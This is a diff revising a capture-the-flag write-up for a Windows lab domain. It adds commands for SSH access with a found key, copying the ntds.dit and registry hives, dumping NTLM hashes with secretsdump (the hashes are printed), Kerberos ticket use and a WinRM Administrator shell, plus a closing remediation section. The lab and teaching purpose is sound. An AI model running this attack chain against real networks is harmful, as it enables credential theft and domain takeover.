@@ -404,9 +404,11 @@ Thanks,
 
 Admin⏎
 
-i think we can ssh into something. lets first check open ports:
+The note suggests that WSL (Windows Subsystem for Linux) has been configured, and the presence of an `id_rsa` key points towards a potential SSH entry point. We perform a port scan to confirm this.
 ```bash
 nmap -Pn 10.10.11.76
+```
+**Scan Results:**
 ```
 Nmap scan report for DC (10.10.11.76)
 Host is up (0.17s latency).
@@ -421,6 +423,7 @@ PORT     STATE SERVICE
 2222/tcp open  EtherNetIP-1
 3268/tcp open  globalcatLDAP
 3269/tcp open  globalcatLDAPssl
+```
 
 ### Discovering SSH Service
 We identify an open SSH service on port 2222 and attempt to connect using the discovered private key:
@@ -435,28 +438,28 @@ svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ cd Active\ Directory/
 svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ ls
 ntds.dit  ntds.jfm
 svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ ls
-SECURITY  SYSTEM
-svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ ls -la
-total 17952
-drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 .
-drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 ..
--rwxrwxrwx 1 svc_backup svc_backup    32768 Jan 30  2025 SECURITY
--rwxrwxrwx 1 svc_backup svc_backup 18350080 Jan 30  2025 SYSTEM
-svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ 
+SAM  SECURITY  SYSTEM
+svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ exit
+logout
+Connection to 10.10.11.76 closed.
 
-now lets get then using scp:
+### Downloading Critical Files
+We use `scp` to download the Active Directory database (`ntds.dit`) and the required registry hives (`SECURITY`, `SYSTEM`) from the remote machine.
 ```bash
 scp -i id_rsa -P 2222 svc_backup@10.10.11.76:/mnt/c/IT/Third-Line\ Support/Backups/Active\ Directory/ntds.dit .
 scp -i id_rsa -P 2222 svc_backup@10.10.11.76:/mnt/c/IT/Third-Line\ Support/Backups/registry/SECURITY .
 scp -i id_rsa -P 2222 svc_backup@10.10.11.76:/mnt/c/IT/Third-Line\ Support/Backups/registry/SYSTEM .
 ```
-Now that we have SYSTEM and SECURITY we can use secretsdump.py to get the password hash from ntds.dit (which is the database of the Active Directory containing all the users and their password hashes)
+
+### Dumping Hashes from NTDS.dit
+With access to the `ntds.dit` file and the `SYSTEM` registry hive, we can extract all the NTLM hashes for the domain.
+
 ```bash
 secretsdump.py -ntds ntds.dit -system SYSTEM -security SECURITY local
 ```
 
-we got:
-
+**Output Hash Dump:**
+```
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
@@ -506,17 +509,40 @@ voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
 
 ### Domain Compromise
 
-#### Obtaining Domain Admin Access
-With the extracted hashes, we can now obtain a TGT for the Administrator account:
+#### Pass-the-Hash with Administrator Account
+Using the extracted AES key for the Administrator account, we can perform a Pass-the-Hash attack to gain privileged access.
 
-```bash
-getTGT.py -aesKey f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb VOLEUR.HTB/Administrator 
-export KRB5CCNAME=Administrator.ccache
-```
+1.  **Obtain TGT for Administrator**:
+    ```bash
+    getTGT.py -aesKey f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb VOLEUR.HTB/Administrator
+    export KRB5CCNAME=Administrator.ccache
+    ```
+
+2.  **Access Privileged SMB Share**:
+    ```bash
+    smbclient.py -k //DC/C$ -c 'ls; cat users/administrator/desktop/root.txt'
+    ```
 
 now we can get a shell
 ```bash
 evil-winrm-py -i dc.voleur.htb -u Administrator -k --no-pass
 ```
 
-GG
+## Conclusion
+
+This penetration test successfully demonstrated a complete attack chain, starting from initial access with supplied credentials and culminating in full domain compromise. The key vulnerabilities and misconfigurations that enabled this were:
+
+-   **Credential Exposure**: Passwords for service accounts were found in a shared file.
+-   **Weak Permissions**: The `svc_ldap` account had `WriteSPN` permissions, allowing for a Kerberoasting attack.
+-   **Insecure Account Management**: A deleted user's account was easily restorable, and their home directory containing sensitive DPAPI data was left accessible on a network share.
+-   **Insecure Backups**: Critical Active Directory backup files (`ntds.dit`, registry hives) were stored in an accessible location, leading to the compromise of all domain credentials.
+
+### Recommendations
+
+To remediate the identified vulnerabilities and improve the overall security posture, the following actions are recommended:
+
+1.  **Implement Strong Password Policies**: Enforce complexity requirements, regular rotation, and prohibit the sharing of credentials in plaintext files.
+2.  **Enforce Principle of Least Privilege**: Regularly audit user and service account permissions. Remove unnecessary privileges, such as the `WriteSPN` permission from the `svc_ldap` account.
+3.  **Secure Account Lifecycle Management**: Establish a formal process for de-provisioning user accounts. This should include wiping or archiving user data to a secure, restricted-access location.
+4.  **Secure Backups**: Ensure that critical system backups, especially for Active Directory, are encrypted and stored in a location with highly restricted access.
+5.  **Monitor for Malicious Activity**: Implement monitoring for unusual activities such as account restoration, DPAPI key access, and large data transfers from sensitive shares.
